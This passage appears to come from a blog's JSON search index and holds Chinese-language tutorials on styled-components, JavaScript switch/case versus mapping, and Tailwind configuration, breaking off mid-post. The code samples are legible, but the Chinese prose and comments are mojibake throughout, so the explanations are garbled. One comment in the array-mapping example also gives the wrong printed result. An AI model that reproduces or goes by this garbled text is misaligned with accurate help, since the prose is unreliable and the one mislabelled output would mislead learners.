å¯ä»¥ç”¨ï¼Œç›´æ¥ä¾†ç¤ºç¯„æ€éº¼ç”¨ï¼š 123456789101112131415161718192021222324252627282930313233const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: #e4e4e4; border: none; color: black; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } ${ props =&gt; props.isDone &amp;&amp; ` background-color: #0e920e66; color: white; ` }`function TodoItem ({ content, handlebuttonClick }) { return ( &lt;TodoItemWrapper&gt; &lt;TodoContent&gt;{content}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; // åœ¨é€™è£¡å‚³å…¥ &lt;Button isDone={true}&gt;å·²å®Œæˆ&lt;/Button&gt; &lt;Button onClick={handlebuttonClick}&gt;åˆªé™¤&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; &lt;/TodoItemWrapper&gt; )} åœ¨ styled Component æ¥æ”¶ props çš„æ–¹å¼æ˜¯é€é ${...}ï¼Œ${...} è£¡é¢æœƒå¯«ä¸€å€‹ function ä¾†æ¥æ”¶ props åƒæ•¸ï¼Œä½ å°±å¯ä»¥æ ¹æ“šå®ƒä¾†å¯«ä¸åŒçš„ style äº†ã€‚ ç¹¼æ‰¿ styleé€™å€‹è·Ÿ class ä¸­çš„ç¹¼æ‰¿æœ‰é»é¡ä¼¼ï¼Œä½ å¯ä»¥å…ˆç¹¼æ‰¿æŸå€‹ styled componentï¼Œ å†ä¸‹æ–°çš„ style ä¾†è¦†å¯«ã€‚ 1234567891011121314151617181920212223const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: #e4e4e4; border: none; color: black; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } ${ props =&gt; props.size === 'XL' ? 'font-size:20px' : 'font-size: 12px' }`// ç¹¼æ‰¿ Buttonconst PinkButton = styled(Button)` background-color: pink;` å¦‚æœè¦å°ã€ŒReactã€çš„ component é‡æ–°è¨­å®š styleå…ˆè¬›ä¸€å€‹è§€å¿µï¼š åªæœ‰ styled component æ‰åƒçš„åˆ°æ¨£å¼ï¼Œæ‰€ä»¥ä½ ç”¨çš„æ™‚å€™ä¸€å®šæ˜¯æ”¾ styled componentï¼Œä¸æ˜¯ react componentã€‚ ç”¨ React component åŒ…è£èµ·ä¾†çš„ styled componentsé€™ç¨®è¦æ­é… props ä¾†å‚³å…¥ classNameï¼š 1234567891011121314151617function TodoItem ({ className, children, handlebuttonClick }) { return ( &lt;TodoItemWrapper className={className}&gt; &lt;TodoContent&gt;{children}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; &lt;Button&gt;å·²å®Œæˆ&lt;/Button&gt; &lt;Button onClick={handlebuttonClick}&gt;åˆªé™¤&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; &lt;/TodoItemWrapper&gt; )}// å¯ä»¥æƒ³æˆæ˜¯é€™é‚Šç”¢ç”Ÿä¸€å€‹ className// ä½ è¦æŠŠé€™å€‹ className æ”¾åˆ°ä½ æƒ³å¥—ç”¨ style çš„ component ä¸Šconst TodoItem2 = styled(TodoItem)` background-color: #d6d6d6;` ç”¨ style component ä¾†åŒ…è£çš„ React component è·Ÿå‰›å‰›åéä¾†ï¼š 1234567891011121314// æŠŠè¦åŒ…è£çš„ react component å‚³å…¥const OrangeButton = styled(TestButton)` ${defaultButton} border-color: ${({ theme }) =&gt; theme.orange}; color: ${({ theme }) =&gt; theme.orange}; &amp;:hover { background-color: ${({ theme }) =&gt; theme.orange}; }`;// è¨˜å¾—è¦å‚³å…¥ classNamefunction TestButton ({ className }) { return &lt;button className={className}&gt;æ¸¬è©¦ç”¨&lt;/button&gt;} Medai queryå…¶å¯¦å°±æ˜¯ç›´æ¥åœ¨ styled ä¸­å¯« @media å°±è¡Œäº†ï¼Œä¸éæ›´å¥½çš„åšæ³•æ˜¯æŠŠ breakpoint æ‹†å‡ºä¾†å¯«æˆå¸¸æ•¸å¼•å…¥æœƒæ›´å¥½ï¼š 12345678910111213141516171819202122232425// å¼•å…¥å°æ‡‰çš„æ–·é»import { MEDIA_TABLET, MEDIA_PC } from './constants/breakpoint'const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: #e4e4e4; border: none; color: black; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } ${MEDIA_TABLET} { font-size: 1.2em; } ${MEDIA_PC} { font-size: 1.5em; }` è®Šæ•¸çš„é‹ç”¨é¦–å…ˆè¦ç”¨ &lt;ThemeProvider&gt; æŠŠæ•´å€‹ component çµ¦åŒ…ä½ï¼š 1234567891011121314151617import { ThemeProvider } from 'styled-components';// é€™é‚Šå°±å¯ä»¥å®šç¾©è¦å‚³é€²å»çš„ propsconst theme = { blue: 'royalblue', orange: 'darkorange', green: 'mediumseagreen', red: 'palevioletred',}ReactDOM.render( // å‚³é€²å» &lt;ThemeProvider theme={theme}&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;, document.getElementById('root')) æ¥è‘—åœ¨å…¶ä»–çš„ style component å°±å¯ä»¥é€é props.theme ä¾†å­˜å–ï¼š 1234567891011121314151617181920212223242526const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: transparent; border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; }`const GreenButton = styled(Button)` border-color: ${props =&gt; props.theme.green}; color: ${props =&gt; props.theme.green};`const OrangeButton = styled(Button)` border-color: ${props =&gt; props.theme.orange}; color: ${props =&gt; props.theme.orange};`const RedButton = styled(Button)` border-color: ${props =&gt; props.theme.red}; color: ${props =&gt; props.theme.red};` æˆæœå¤§æ¦‚å°±åƒé€™æ¨£ï¼š ä¸åŒçš„æ¨™ç±¤æƒ³å¥—ç”¨ç›¸åŒæ¨£å¼å‡è¨­æˆ‘å¯«äº†ä¸€å€‹ &lt;button&gt; çš„ styled componentï¼Œä½†ä»Šå¤©åˆæƒ³åœ¨ &lt;a&gt; ä¸Šç”¨ä¸€æ¨£çš„æ¨£å¼æ™‚ï¼Œä¸éœ€è¦é‡æ–°å¯«ä¸€éï¼Œåªè¦åˆ©ç”¨ as å°±å¯ä»¥äº†ï¼š 123456789101112131415161718192021222324252627282930const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: transparent; border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } &amp;:hover { background-color: ${props =&gt; props.theme.blue}; color: white; }`function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;Button&gt;Button&lt;/Button&gt; // ç”¨ as è®Šæˆå¸Œæœ›çš„æ¨™ç±¤ &lt;Button as=\"a\" href=\"#\"&gt;Link&lt;/Button&gt; &lt;Button as=\"a\" href=\"#\"&gt;Link&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; )} æˆ–ç”šè‡³æ˜¯è®Šæˆå¦ä¸€å€‹ component ä¹Ÿè¡Œï¼š 12345678910111213141516function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;Button&gt;Button&lt;/Button&gt; &lt;Button as={ReversedButton}&gt;Button&lt;/Button&gt; &lt;ReversedButton&gt;é¡›å€’æ–‡å­—çš„æŒ‰éˆ•&lt;/ReversedButton&gt; &lt;/TodoButtonWrapper&gt; )}function ReversedButton ({ children }) { return &lt;Button&gt;{children.split('').reverse()}&lt;/Button&gt;} è‡ªå‹•åˆ¤æ–·æ˜¯ä¸æ˜¯ HTML å…ƒç´ çš„å±¬æ€§1234567&lt;TodoItemWrapper&gt; &lt;TodoContent&gt;{todo.content}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; &lt;GreenButton isDone={todo.isDone} data-id={todo.id} onClick={handleCompletedButtonClick}&gt;{todo.isDone ? 'å·²å®Œæˆ' : 'æœªå®Œæˆ'}&lt;/GreenButton&gt; &lt;RedButton data-id={todo.id} onClick={handleRemoveButtonClick}&gt;åˆªé™¤&lt;/RedButton&gt; &lt;/TodoButtonWrapper&gt;&lt;/TodoItemWrapper&gt; ä»¥é€™å€‹ä¾‹å­ä¾†èªªï¼ŒGreenButton å¯«äº† isDone å’Œ data-id å…©å€‹å±¬æ€§ï¼Œä½†å¯¦éš›ä¸Šæœƒè¢«æ¸²æŸ“å‡ºä¾†çš„åªæœ‰ data-idï¼Œä¸æœƒæœ‰ isDoneï¼š é€™å°±æ˜¯ style component æœƒåšçš„è‡ªå‹•åˆ¤æ–·ã€‚ ä¸éæœ‰ä¸€ç¨®æƒ…æ³æ˜¯å¯èƒ½æˆ‘æƒ³åœ¨ style component å‚³ id é€™å€‹ propsï¼š 1234&lt;GreenButton id={todo.id} onClick={handleButtonClick('isCompleted')}&gt;{todo.isDone ? 'å·²å®Œæˆ' : 'æœªå®Œæˆ'}&lt;/GreenButton&gt; å¯æ˜¯åˆä¸å¸Œæœ›è¢«æ¸²æŸ“åˆ° HTML ä¸Šï¼Œé€™æ™‚å€™å°±å¯ä»¥æ”¹ç”¨ $ ä¾†å‚³ï¼ˆTransient propsï¼‰ï¼š 1234&lt;GreenButton $id={todo.id} onClick={handleButtonClick('isCompleted')}&gt;{todo.isDone ? 'å·²å®Œæˆ' : 'æœªå®Œæˆ'}&lt;/GreenButton&gt; é€™æ¨£å°±ä¸æœƒè¢«æ¸²æŸ“äº†ã€‚ æ‰€ä»¥å»ºè­°é¤Šæˆä¸€ç¨®ç¿’æ…£ï¼Œåªè¦æ˜¯çµ¦ style component ç”¨çš„ props å°±ä¸€å¾‹ç”¨ $ ä¾†è¡¨ç¤ºï¼Œå¯è®€æ€§æœƒæ›´å¥½ã€‚ è¨­å®šå±¬æ€§å€¼è¦åœ¨ style component ä¸Šè¨­å®š HTML å…ƒç´ çš„å±¬æ€§æœ‰å…©ç¨®æ–¹å¼ï¼Œç¬¬ä¸€ç¨®æ˜¯ç›´æ¥å¯«åœ¨ Component ä¸Šï¼š 123456789101112const RadioButton = styled.input``function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;RadioButton type=\"radio\" name='gender' value=\"man\"&gt;&lt;/RadioButton&gt; &lt;RadioButton type=\"radio\" name='gender' value=\"female\"&gt;&lt;/RadioButton&gt; &lt;/TodoButtonWrapper&gt; )} ç¬¬äºŒç¨®æ˜¯é€é style.attrs å±¬æ€§ï¼š 123456789101112const RadioButton = styled.input.attrs({ type: 'radio' })``function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;RadioButton name='gender' value=\"man\"&gt;&lt;/RadioButton&gt; &lt;RadioButton name='gender' value=\"female\"&gt;&lt;/RadioButton&gt; &lt;/TodoButtonWrapper&gt; )} çœ‹èµ·ä¾†æ˜¯ç¬¬äºŒç¨®æœƒå¥½ä¸€é»ï¼Œå› ç‚ºåªè¦å¯«åœ¨ä¸€å€‹åœ°æ–¹å°±å¥½ï¼Œä¹‹å¾Œè¦æ”¹æœƒæ¯”è¼ƒæ–¹ä¾¿ã€‚ è¨­å®šå…¨åŸŸç©ºé–“çš„æ¨£å¼ç•¶æƒ³è¦æ”¹ &lt;body&gt; æˆ–æ˜¯ reset çš„æ¨£å¼æ™‚ï¼Œæ‡‰è©²å°±æœƒç”¨åˆ°ã€‚é€™æ˜¯é€é createGlobalStyle ä¾†é”æˆçš„ã€‚ é¦–å…ˆè¦å…ˆå¯«å¥½å…¨åŸŸçš„ style componentï¼š 1234567891011import { createGlobalStyle } from \"styled-components\";export const GlobalStyle = createGlobalStyle` body { // å…¨åŸŸç©ºé–“çš„ style background-color: pink; } .bg-dark { background-color: black; }` æ¥è‘—å¼•å…¥åˆ° entry å°±æœƒå¥—ç”¨äº†ï¼š 123456789ReactDOM.render( &lt;ThemeProvider theme={theme}&gt; // æ”¾åœ¨é€™è£¡ï¼Œä¸æ˜¯å¤–é¢ // å¦å¤–å› ç‚ºæ˜¯åŒ…åœ¨ ThemeProvide è£¡ï¼Œæ‰€ä»¥ä¹Ÿèƒ½å­˜åˆ° theme çš„ props &lt;GlobalStyle /&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;, document.getElementById('root')) å®šç¾©åœ¨ Global çš„ className ä¹Ÿå¯ä»¥åœ¨åº•ä¸‹çš„ component ä½¿ç”¨ï¼š 123456789function TestScope () { return ( &lt;TodoButtonWrapper className=\"bg-dark\"&gt; &lt;Button&gt;123&lt;/Button&gt; &lt;Button&gt;456&lt;/Button&gt; &lt;Button&gt;789&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; )} çµ¦é¸å–å™¨æ›´é«˜çš„æ¬Šé‡ï¼š&amp;&amp;å…ˆä¾†çœ‹æ®µ codeï¼š 123456789101112131415161718192021222324const Span = styled.span` &amp;&amp; { color: blue }`const GlobalStyle = createGlobalStyle` body { // å…¨åŸŸç©ºé–“çš„ style } span${Span} { color: red; }`ReactDOM.render( &lt;ThemeProvider theme={theme}&gt; &lt;GlobalStyle /&gt; &lt;App /&gt; &lt;Span&gt;I'm span&lt;/Span&gt; &lt;/ThemeProvider&gt;, document.getElementById('root')) ç°¡å–®ä¾†èªªï¼Œæˆ‘åœ¨ Global å®£å‘Š span${Span} è¦æ˜¯ç´…è‰²ï¼Œä½†æˆ‘å¸Œæœ›å¯¦éš›æ˜¯è—è‰²ï¼Œæ‰€ä»¥å°±åœ¨ Span ä¸­ç”¨ &amp;&amp; ä¾†è¦†å¯«å…¨åŸŸè¨­å®šï¼š æ³¨æ„ &amp; è·Ÿ &amp;&amp; çš„å·®åˆ¥ï¼Œä¸€å€‹æœƒè¢«è¦†å¯«ä¸€å€‹ä¸æœƒã€‚ æŠŠæœƒé‡è¤‡ä½¿ç”¨çš„æ¨£å¼å­˜èµ·ä¾†style component æœ‰æä¾› css æ–¹æ³•è®“ä½ æŠŠæœƒå…±ç”¨çš„æ¨£å¼å„²å­˜èµ·ä¾†ï¼Œå®ƒçš„å¯«æ³•æ˜¯é€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import { css } from 'styled-components'// æŠŠå…±é€šçš„æ¨£å¼ç”¨ function å­˜èµ·ä¾†const buttonDefault = () =&gt; css` border-radius: 4px; padding: 8px 12px; background-color: transparent; cursor: pointer; flex-shrink: 0; // é€™å€‹å¯«æ³•æœƒæœ‰ä¸€äº›å•é¡Œï¼Œç•™åˆ°ä¸‹é¢ä¾†è§£é‡‹ &amp; + &amp; { margin-left: 8px; }`const BlueButton = styled.button` // ç›´æ¥å¼•ç”¨ ${buttonDefault} border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; &amp;:hover { background-color: ${props =&gt; props.theme.blue}; color: white; }`const GreenButton = styled.button` // ç›´æ¥å¼•ç”¨ ${buttonDefault} border-color: 'green'; color: 'green'; &amp;:hover { background-color: 'green'; }`const OrangeButton = styled.button` // ç›´æ¥å¼•ç”¨ ${buttonDefault} border-color: 'orange'; color: 'orange'; &amp;:hover { background-color: 'orange'; }`const RedButton = styled.button` // ç›´æ¥å¼•ç”¨ ${buttonDefault} border-color: 'red'; color: 'red'; &amp;:hover { background-color: 'red'; }` é€™æ¨£å°±èƒ½åšå‡ºé€™æ¨£çš„æ•ˆæœï¼š ä¸éæœƒç™¼ç¾ &amp; + &amp; çš„éƒ¨åˆ†ä¸¦æ²’æœ‰å¥—ç”¨åˆ°ï¼Œç‚ºä»€éº¼ï¼Ÿ é€™æ˜¯å› ç‚ºç•¶ä½ å»ºç«‹ä¸€å€‹æ–°çš„ style component æ™‚å…¶å¯¦æœƒé‡æ–°ç”¢ç”Ÿä¸€å€‹ classNameï¼Œæ‰€ä»¥ä½ çš„ &amp; + &amp; å…¶å¯¦æ˜¯é€™æ¨£å­ï¼š 123456789BlueButton + BlueButton { margin-left: 8px}greenButton + greenButton { margin-left: 8px} RedButton + RedButton { margin-left: 8px} ä¸Šåœ–ä¸­çš„ç¶ æŒ‰éˆ•æ—é‚Šæ¥çš„æ˜¯ç´…æŒ‰éˆ•ï¼Œæ‰€ä»¥æ‰æ²’æœ‰å¥—ç”¨é€™å€‹è¦å‰‡ã€‚ è¦è§£æ±ºé€™å€‹å•é¡Œçš„è¾¦æ³•æœ‰å…©ç¨®ï¼Œä¸€ç¨®æ˜¯æ”¹ç”¨ã€Œç¹¼æ‰¿ã€çš„å¯«æ³•ï¼š 1234567891011121314151617181920212223242526const BlueButton = styled.button` border-radius: 4px; padding: 8px 12px; background-color: transparent; border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } &amp;:hover { background-color: ${props =&gt; props.theme.blue}; color: white; }`const GreenButton = styled(BlueButton)` // ...`const OrangeButton = styled(BlueButton)` // ...`const RedButton = styled(BlueButton)` // ...` å› ç‚ºæ˜¯é€éç¹¼æ‰¿ï¼Œæ‰€ä»¥ BlueButton çš„éƒ¨åˆ†ä¸æœƒé‡æ–°ç”¢ç”Ÿ classNameï¼Œåªæœ‰å¾Œä¾†æ–°å¢çš„æ‰æœƒã€‚ å¦ä¸€ç¨®æ–¹å¼æ˜¯æŠŠ &amp; + &amp; çš„è¦å‰‡é€éçˆ¶å±¤ä¾†æŒ‡å®šï¼š 12345678const TodoButtonWrapper = styled.div` display: flex; align-items: center; // åº•ä¸‹çš„ button + button æœƒå¥—ç”¨ button + button { margin-left: 8px; }` è‡³æ–¼å“ªç¨®å¯«æ³•æ¯”è¼ƒå¥½å°±è¦‹ä»è¦‹æ™ºï¼Œæˆ‘å€‹äººæ˜¯è¦ºå¾—ç¹¼æ‰¿çš„å¯«æ³•æ¯”è¼ƒç›´è¦ºä¸€é»ï¼Œä¸éç¼ºé»æ˜¯å…ƒä»¶æœ¬èº«æœƒå¤šä¸€æ¢é™åˆ¶ï¼Œå› æ­¤ã€Œå¯é‡ç”¨æ€§ã€æœƒæ¯”è¼ƒå·®ã€‚ å…¶ä»–è£œå…… style.button è·Ÿ style('button') æ˜¯ç­‰åƒ¹çš„æ±è¥¿ ä¸è¦æŠŠ style component å¯«åœ¨ React component è£¡é¢ï¼Œæœƒæœ‰æ•ˆèƒ½å•é¡Œï¼ˆæ¯æ¬¡ render å°±é‡æ–°å®£å‘Šï¼‰","link":"/2022/04/05/styled-components-basic/"},{"title":"switch case","text":"å¥½åƒæœ‰é»é‚Šç·£çš„ switchã€‚ å¦‚æœæ²’æœ‰ switch1234567891011var month = 1if (month === 1) { console.log('ä¸€æœˆ')} else if (month === 2) { console.log('äºŒæœˆ')} else if (month === 3) { console.log('ä¸‰æœˆ')} else if (month === 4) { console.log('å››æœˆ')} è¨˜å¾—ä¹‹å‰çœ‹æ›¸æ˜¯èªªç”¨ if çš„æ•ˆèƒ½æ¯”è¼ƒä¸å¥½ï¼Œå› ç‚º month = 4 çš„è©±ï¼Œåœ¨åŸ·è¡Œåˆ° console.log('å››æœˆ') ä¹‹å‰çš„æ¯ä¸€å€‹ if éƒ½è¦èµ°éä¸€éã€‚ æœ‰äº† switchæ¢ä»¶å¾ˆå¤šçš„æ™‚å€™å°±æ˜¯é©åˆç”¨ switchï¼Œä½†è¨˜å¾—åˆ¥å¿˜äº†åŠ  break è·Ÿ default é€™å…©å€‹æ±è¥¿ã€‚ï¼ˆå¿˜äº†åŠ  break çš„è©±æ¯ä¸€è¡Œéƒ½æœƒè¢«åŸ·è¡Œåˆ°ï¼‰ 12345678910111213141516switch (month) { case 1: console.log('ä¸€æœˆ') break case 2: console.log('äºŒæœˆ') break case 3: console.log('ä¸‰æœˆ') break case 4: console.log('å››æœˆ') break default: console.log('hello')} å¾Œä¾†å­¸åˆ°ä¹Ÿå¯ä»¥ã€Œå¤šå€‹ caseã€æŒ‡å‘åŒå€‹å€å¡Šï¼š 123456789101112131415161718switch (month) { case 1: case 2: console.log('ä¸€æœˆæˆ–äºŒæœˆ') break case 3: console.log('ä¸‰æœˆ') break case 4: console.log('å››æœˆ') break case 5: console.log('äº”æœˆ') break default: console.log('hello')} å…¶å¯¦ä¹Ÿæœ‰æ›´å¥½çš„åšæ³•ï¼ˆMapping æ˜ å°„ï¼‰ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ Mapping çš„æ“ä½œã€‚ Mapping çš„æ¦‚å¿µå°±æ˜¯ä½ å»ºç«‹ä¸€å€‹ã€Œé™£åˆ—ã€æˆ–ã€Œç‰©ä»¶ã€ï¼ŒæŠŠ value è¨­å®šæˆä½ è¦çš„å€¼ï¼Œæ¥è‘—ç”¨ key ä¾†å–å‡ºï¼Œå°±åƒå»ºç«‹ä»£è™Ÿçš„æ¦‚å¿µï¼š A ä»£è¡¨ å°æ˜ B ä»£è¡¨ å°èŠ± é™£åˆ—çš„ mapping123var month = 1chineseMonth = ['ä¸€æœˆ', 'äºŒæœˆ', 'ä¸‰æœˆ', 'å››æœˆ', 'äº”æœˆ']console.log(chineseMonth[month -1]) // äº”æœˆ ç‰©ä»¶çš„ mapping12345678var code = 'A'people = { A: 'å°æ˜', B: 'å°èŠ±', C: 'å°æœ±', D: 'å°é£›'}console.log(people[code]) // å°æ˜","link":"/2021/12/17/switch-case/"},{"title":"Tailwind é›œè¨˜","text":"ä¾†é»ä¸ä¸€æ¨£çš„ CSSã€‚ ç°¡è¿°Tailwind å¾ä»¥å‰çµ¦æˆ‘çš„å°è±¡å°±æ˜¯å€‹éº»ç…©çš„æ±è¥¿ï¼Œä½†ä¸¦ä¸æ˜¯å› ç‚º HTML å¾ˆé›£çœ‹çš„é—œä¿‚ï¼Œè€Œæ˜¯ç•¶ç¿’æ…£äº† CSS Selector çš„æ¦‚å¿µå¾Œï¼Œå°±æœƒè¦ºå¾— Tailwind é€™ç¨®å…¨éƒ¨ç¶åœ¨ class ä¸­çš„å¯«æ³•ç”¨èµ·ä¾†å„ç¨®éšœç¤™ã€‚ ä½†è‡ªå¾å­¸äº† React å¾Œï¼Œé€æ¼¸é«”æœƒåˆ° Component è·Ÿ Tailwind çµåˆèµ·ä¾†ç”¨çš„æ•ˆç›Šï¼Œæ…¢æ…¢çš„æ”¹è®Šäº†ä»¥å‰çš„è§€é»ã€‚ ç¸½ä¹‹é€™ç¯‡æœƒæŠŠæˆ‘æƒ³è¨˜çš„ä¸€äº›è§€å¿µçµ¦å¯«ä¸‹ä¾†ï¼Œå¦‚æœæƒ³çŸ¥é“æ›´å¤šçš„è©±æ¨è–¦åƒè€ƒé€™ä»½ å®˜æ–¹æ–‡ä»¶ã€‚ å‰ç½®ä½œæ¥­åˆå§‹åŒ–ç°¡å–®ä¾†èªªå°±æ˜¯å»ºç«‹ tailwind.config.jsï¼Œå¯ä»¥ç”¨åº•ä¸‹çš„æŒ‡ä»¤ä¾†ç”¢ç”Ÿï¼š 1npx tailwind init åˆå§‹åŒ–çš„è¨­å®šæœƒé•·é€™æ¨£ï¼š 12345678/** @type {import('tailwindcss').Config} */module.exports = { content: [], theme: { extend: {} }, plugins: []} ç·¨è­¯å¦‚æœå‰›å‰›åˆå§‹åŒ–ä»¥å¾Œæ²’æœ‰è¨­å®š content å°±ç›´æ¥åŸ·è¡Œç·¨è­¯çš„è©±ï¼Œå¯èƒ½æœƒçœ‹åˆ°é€™æ®µè¨Šæ¯ï¼š ç°¡å–®ä¾†èªªé€™é‚Šæ˜¯è¦ä½ è¨­å®šã€Œæ‰€æœ‰æœƒä½¿ç”¨åˆ° tailwind class åç¨±ã€çš„æª”æ¡ˆè·¯å¾‘ï¼Œä¾‹å¦‚èªªæˆ‘åœ¨ ./public/index.html ä¸­æœ‰ç”¨åˆ°é€™äº› classï¼Œé‚£æˆ‘å°±æœƒé€™æ¨£è¨­å®šï¼š 12345678/** @type {import('tailwindcss').Config} */module.exports = { content: ['./src/**/*.{html,js}'], // src åº•ä¸‹æ‰€æœ‰çš„ .html æˆ– .js æª”æ¡ˆ theme: { extend: {} }, plugins: []} é™„è¨»ï¼šglob pattern å¯ä»¥åƒè€ƒé€™ä»½ cheat-sheet è¨­å®šå®Œå†è·‘ä¸€æ¬¡ç·¨è­¯æ™‚ï¼ŒTailwind å°±æœƒè‡ªå‹•æ ¹æ“šæˆ‘è¨­å®šçš„è·¯å¾‘ä¾†ç”¢å‡ºæ‰€æœ‰ç”¨åˆ°çš„ classï¼Œå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨å›‰ï¼æ›´å¤šç´°ç¯€è«‹åƒè€ƒ å®˜æ–¹æ–‡ä»¶ æ–°å¢è‡ªå·±çš„ utils å…ˆå¼•å…¥ plugin åŸ·è¡Œ plugin æ™‚æœƒæ‹¿åˆ° addUtilities é€™å€‹åƒæ•¸ï¼Œç”¨å®ƒä¾†åŠ å°±å°äº† é™„è¨»ï¼šè¨˜å¾—è¦åŠ ä¸Š .ï¼ˆæœ‰è¢«é›·åˆ°éï¼‰ 123456789101112131415161718192021/** @type {import('tailwindcss').Config} */const plugin = require('tailwindcss/plugin')module.exports = { content: ['./src/**/*.{js,jsx,ts,tsx}'], theme: { extend: {} }, plugins: [ plugin(function ({ addUtilities }) { addUtilities({ '.rotateY-90': { transform: 'rotateY(90deg)' }, '.rotateY-0': { transform: 'rotateY(0deg)' } }) }) ]} æ–°å¢é¡è‰²å¯ä»¥åœ¨ extend ä¸­æ–°å¢é …ç›®ã€‚ 123456789101112131415module.exports = { content: ['./src/**/*.{js,jsx,ts,tsx}'], theme: { extend: { colors: { primary: '#F97C7C', secondary: { 100: '#3a97d4', 200: '#1a2037' } } } }, plugins: []} è£œå……ä¸€ä¸‹é€™èƒŒå¾Œçš„é‹ä½œæ–¹å¼ï¼Œå¦‚æœä½ ç”¨ tailwind init --full ä¾†åšåˆå§‹åŒ–çš„è©±å¯ä»¥çœ‹åˆ° config é è¨­å€¼ã€‚æ¥è‘—ä½ æ»‘åˆ° colors æ®µè½æ‡‰è©²èƒ½çœ‹åˆ°é€™æ¨£çš„å…§å®¹ï¼š 123456789101112131415161718192021222324/** @type {import('tailwindcss').Config} */module.exports = { // ç•¥... theme: { screens: { sm: '640px', md: '768px', lg: '1024px', xl: '1280px', '2xl': '1536px' }, // colors åˆå§‹å€¼ colors: ({ colors }) =&gt; ({ inherit: colors.inherit, current: colors.current, transparent: colors.transparent, black: colors.black, white: colors.white, slate: colors.slate, gray: colors.gray // ç•¥... }) }} ç°¡å–®ä¾†èªª colors å°±åªæ˜¯ä¸€å€‹ç‰©ä»¶ï¼ˆfunction çš„å›å‚³å€¼ï¼‰è€Œå·²ï¼Œæ‰€ä»¥ç•¶ä½ æ·»å¢ä¸€äº›æ–°çš„å±¬æ€§åˆ° colors èº«ä¸Šä»¥å¾Œï¼Œtailwind å°±å¯ä»¥ä¾æ“šé€™å€‹ç‰©ä»¶ä¾†ç”¢ç”Ÿå°æ‡‰çš„ class èˆ‡ css å…§å®¹ï¼Œå…¶å¯¦å°±åªæ˜¯é€™æ¨£è€Œå·²ã€‚ æ ¹æ“šçˆ¶å±¤çš„ç‹€æ…‹ä¾†æ”¹è®Š styleèˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å¸Œæœ›çˆ¶å±¤ hover çš„æ™‚å€™æ”¹è®Šå­å±¤çš„æ¨£å¼ï¼Œé‚£å¯ä»¥ç”¨ group é€™å€‹æ–¹å¼ä¾†åšï¼š 123456&lt;div class=\"group\"&gt; &lt;!-- çˆ¶å±¤ hover æ™‚å¥—ç”¨ bg-rose-400 --&gt; &lt;div class=\"group-hover:bg-rose-400 w-1/2 mx-auto my-10 p-4 bg-blue-300 rounded duration-300\"&gt; &lt;h1 class=\"text-white text-center text-2xl\"&gt;Hello&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt; first-child / odd /even ä¹‹é¡çš„é¡é¸å–å™¨è¦ç”¨çš„è©±å¯ä»¥ç”¨ odd:*ã€even:* æˆ– first:* ä¹‹é¡çš„ class ä¾†åšï¼š 12345678&lt;div class=\"w-1/2 mx-auto py-10\"&gt; &lt;div class=\"mb-2 p-4 rounded odd:bg-sky-300 even:bg-rose-300\"&gt; &lt;h1 class=\"text-white text-center text-2xl\"&gt;Hello&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"mb-2 p-4 rounded odd:bg-sky-300 even:bg-rose-300\"&gt; &lt;h1 class=\"text-white text-center text-2xl\"&gt;Hello&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt; æˆ‘ç•¶æ™‚é‚„è »ç–‘æƒ‘çš„å•é¡Œæ˜¯ï¼Œå¦‚æœæˆ‘æœ‰ 10 åˆ—çš„è©±ä¸å°±å¾—å¯« 10 æ¬¡ï¼Ÿè€Œä¸”é€™è·Ÿæˆ‘ç›´æ¥ç”¨äººå·¥æŠŠå¥‡æ•¸å¶æ•¸çš„æ¨£å¼å¥—ç”¨ä¸åŒçš„ class æœ‰ä»€éº¼å·®ï¼Ÿ ä½†å¾Œä¾†ä»”ç´°æƒ³æƒ³ï¼Œç•¶æˆ‘å€‘çœŸçš„åœ¨é¡¯ç¤ºè³‡æ–™æ™‚ä¸å¤ªå¯èƒ½é€™æ¨£ hard codeï¼Œä»¥ React ä¾†èªªçš„è©±ï¼Œæˆ‘å€‘å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617const arr = ['Hello', 'Hello', 'Hello', 'Hello', 'Hello', 'Hello']const List = ({ text }) =&gt; ( &lt;div class='mb-2 p-4 rounded odd:bg-sky-300 even:bg-rose-300'&gt; &lt;h1 class='text-white text-center text-2xl'&gt;{text}&lt;/h1&gt; &lt;/div&gt;)export default function Com1() { return ( &lt;div class='w-1/2 mx-auto py-10'&gt; {arr.map((item) =&gt; ( &lt;List text={item} 